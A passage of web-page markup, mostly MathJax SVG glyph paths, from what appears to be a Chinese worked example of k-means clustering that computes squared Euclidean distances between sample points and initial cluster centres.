622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5603,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(6889.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(7945.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(8334.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(8834.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(9278.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(9778.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(10761.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(11205.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(12492.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(13548.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(13937.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(14437.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(14881.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(15381.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="28.221ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 12473.5 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2142.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3198.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(3587.2,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(4087.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(4531.9,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(5031.9,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(6014.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6459.1,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(8601.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(9657.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(10046.3,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(10546.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(10991,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(11491,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>的欧氏距离平方。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.67ex" height="2.47ex" role="img" focusable="false" viewBox="0 -841.7 5158.3 1091.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 